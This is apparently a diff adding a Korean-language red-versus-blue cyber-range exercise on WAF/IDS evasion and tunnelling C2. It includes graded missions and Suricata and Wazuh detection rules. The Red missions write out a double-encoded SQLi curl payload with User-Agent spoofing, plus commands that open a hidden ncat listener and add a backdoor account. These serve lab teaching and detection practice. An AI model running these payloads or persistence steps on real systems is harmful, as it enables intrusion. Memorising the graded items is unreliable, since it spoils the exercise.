@@ -1,0 +1,235 @@
+id: "attack-adv-w03"
+category: "attack-adv"
+title: "[공격고급 W3] 네트워크 우회 — WAF/IDS 회피·터널링 vs 우회 탐지"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  공격 고급과정 3주차 — **네트워크 우회**. 방화벽·IDS·WAF 를 회피하는 기법(패킷 분할, 디코이, 인코딩, 터널링)을
+  실습한다. Red 는 탐지를 회피하며 공격하고, Blue 는 회피에 강한 탐지로 맞선다.
+
+  ▸ 이야기
+    공격자가 URL 인코딩·UA 스푸핑으로 WAF 를 우회해 공격하고, HTTP/ICMP/DNS 터널로 C2 채널을 숨긴다.
+    방어자는 인코딩에 강한 룰과 비표준 터널 포트 탐지로 우회를 잡는다.
+
+  ▸ 모드
+    • solo : 한 학생이 우회 공격(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라를 우회 공격, Blue 는 자기 인프라에서 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(WAF audit / 터널 포트·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    우회 공격 태그 **`aa03r1-<본인id>`**, 터널 C2 포트 **55003**, 계정 **`atka03`**,
+    Suricata 탐지 **sid 9703011**, Wazuh 탐지 **id 103031**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [WAF 우회] — 인코딩·UA 스푸핑으로 탐지 회피 공격
+
+      ### 상황
+      너는 URL 인코딩·대소문자 변형·주석 삽입으로 WAF 시그니처를 우회하며 SQLi 를 보낸다(태그 `aa03r1-<본인id>`).
+      우회를 시도해도 audit 엔 흔적이 남는다 — 그것이 방어자의 개선 입력이 된다.
+
+      ### 할 일 (attacker-ext)
+      예시(id=kim) — 인코딩/변형:
+      ```bash
+      curl -s -A "Mozilla/5.0 aa03r1-kim" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/sqli/?id=aa03r1-kim%2527%2520uNiOn%2520SeLeCt%25201--+&Submit=Submit"
+      ```
+
+      ### 채점 방법
+      대상 WAF audit(modsec)에 태그 `aa03r1` 가 포함된 공격 흔적이 남았는지로 채점.
+
+      ### 합격 기준
+      대상 WAF audit 에 `aa03r1` 태그가 포함된 공격 흔적이 남는다.
+    hint: "URL 인코딩/UA 스푸핑 우회 SQLi(태그 aa03r1) → 대상 modsec audit. 채점: log_contains modsec aa03r1."
+    verify:
+      type: "log_contains"
+      expect: "aa03r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "aa03r1", since_sec: 1800 } }
+      semantic:
+        intent: "방어 회피(T1027 난독화 + T1190) — 인코딩/UA 스푸핑 WAF 우회. 대상 WAF audit, 태그(aa03r1) 귀속."
+        success_criteria:
+          - "대상 WAF audit 에 aa03r1 태그가 포함된 공격 흔적"
+          - "어떤 우회 기법(인코딩/변형/UA)을 썼는지 서술"
+        acceptable_methods:
+          - "attacker-ext 에서 인코딩/UA 우회 SQLi"
+        negative_signs:
+          - "태그 누락 / 대상 미도달"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [터널링 C2] — HTTP/ICMP/DNS 터널로 채널 은닉
+
+      ### 상황
+      방화벽을 우회하는 또 다른 길은 **터널링**이다. 너는 허용 포트로 위장한 터널 C2 채널 **포트 55003** 을 열고
+      계정 **`atka03`** 을 만든다(개념: HTTP POST 본문/ICMP/DNS 쿼리에 명령을 숨김).
+
+      ### 할 일
+      ```bash
+      nohup ncat -lk 55003 >/dev/null 2>&1 &     # 터널 C2 (또는 nc/python)
+      sudo useradd -m -s /bin/bash atka03
+      ```
+
+      ### 채점 방법
+      대상 호스트에 포트 55003 listening 이거나 `/etc/passwd` 에 `atka03` 이 있는지로 채점.
+
+      ### 합격 기준
+      포트 55003 listening 또는 계정 `atka03`.
+    hint: "터널 C2 포트 55003 + useradd atka03. 채점: port_listening 55003 + file_contains passwd atka03."
+    verify:
+      type: "port_listening"
+      expect: "55003"
+      checks:
+        - { id: "red-2-1", type: "port_listening", target: "web", params: { port: 55003 } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "atka03" } }
+      semantic:
+        intent: "터널링 C2(T1572) + 계정(T1136) — 허용 포트 위장 터널. 방화벽 우회 채널."
+        success_criteria:
+          - "포트 55003 listening 또는 계정 atka03"
+          - "터널링 원리(HTTP/ICMP/DNS)와 우회 의도 서술"
+        acceptable_methods:
+          - "리스너 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [우회에 강한 탐지] — 인코딩 정규화 Suricata 룰 (sid 9703011)
+
+      ### 상황
+      우회를 막으려면 **정규화 후 패턴**을 봐야 한다. 인코딩/대소문자 변형에도 SQLi 키워드를 잡는 Suricata
+      룰(**sid 9703011**)을 만든다.
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"ATKADV-W03 evasion-resistant SQLi"; flow:to_server; http.uri; content:"union"; nocase; content:"select"; nocase; sid:9703011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+      > Suricata 의 http.uri 는 URL 디코딩된 버퍼라 `%2520` 같은 이중 인코딩 우회를 정규화해 잡는다.
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9703011 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 우회에 강한 sid 9703011 룰이 존재한다.
+    hint: "정규화(http.uri nocase)로 인코딩 우회에 강한 Suricata 룰(sid 9703011) → reload. 채점: file_contains local.rules 9703011."
+    verify:
+      type: "file_contains"
+      expect: "9703011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9703011" } }
+      semantic:
+        intent: "우회 저항 탐지 — http.uri 정규화 + nocase 로 인코딩/변형 우회 흡수. 정규화가 우회 방어의 핵심."
+        success_criteria:
+          - "local.rules 에 sid 9703011 (nocase 정규화)"
+          - "왜 정규화가 인코딩 우회를 막는지 서술"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "원시 문자열 매칭(쉽게 우회) / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 22
+    instruction: |
+      ## 🛡️ BLUE-2 [터널/비표준 포트 탐지] — Wazuh 룰 (id 103031)
+
+      ### 상황
+      RED-2 의 터널 C2(비표준 포트 55003)·계정 변조를 잡는 Wazuh 룰(**id 103031**)을 만든다.
+
+      ### 할 일
+      ```xml
+      <group name="edu,evasion,">
+        <rule id="103031" level="12">
+          <if_group>edu</if_group>
+          <match>atka03</match>
+          <description>ATKADV-W03 - tunneling C2 / backdoor account indicator</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 103031 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 터널/계정 지표를 보는 id 103031 룰이 존재한다.
+    hint: "터널/계정 지표 Wazuh 룰(id 103031) → restart. 채점: file_contains local_rules.xml 103031."
+    verify:
+      type: "file_contains"
+      expect: "103031"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103031" } }
+      semantic:
+        intent: "터널/우회 탐지(호스트) — 비표준 포트 터널/백도어 계정 Wazuh 룰. 우회 채널 포착."
+        success_criteria:
+          - "local_rules.xml 에 rule id 103031"
+          - "터널/계정 지표 탐지 로직 + 비표준 포트 모니터링 서술"
+        acceptable_methods:
+          - "Wazuh 룰 작성 + restart"
+        negative_signs:
+          - "탐지 로직 부실 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [우회 기법 분석·방어] — 효과와 한계 종합
+
+      ### 상황
+      각 우회 기법(패킷 분할/디코이/인코딩/터널링)의 효과와 한계, 그리고 방어 관점의 대응을 분석한다.
+
+      ### 할 일
+      보고서에:
+      - 기법별 효과/한계(어떤 탐지를 회피하고 무엇에 약한가)
+      - 방어 대응(정규화, 비표준 포트 모니터링, egress 필터링) + 터널 포트(55003)/계정(atka03) 헌팅
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 우회 기법 분석/방어로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 우회 기법 효과·한계·방어·헌팅은 제출로 검증).
+    hint: "우회 기법별 효과/한계 + 방어(정규화/egress 필터/비표준 포트 모니터) + 터널 포트/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "우회 분석·방어 — 기법별 효과/한계 + 방어 대응 + 헌팅. 분석형 — 구체 대응 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "우회 기법별 효과/한계 + 방어 대응"
+          - "터널 포트/계정 헌팅 결과"
+        acceptable_methods:
+          - "기법 분석표 + 방어 + 헌팅"
+        negative_signs:
+          - "한계/방어 누락"
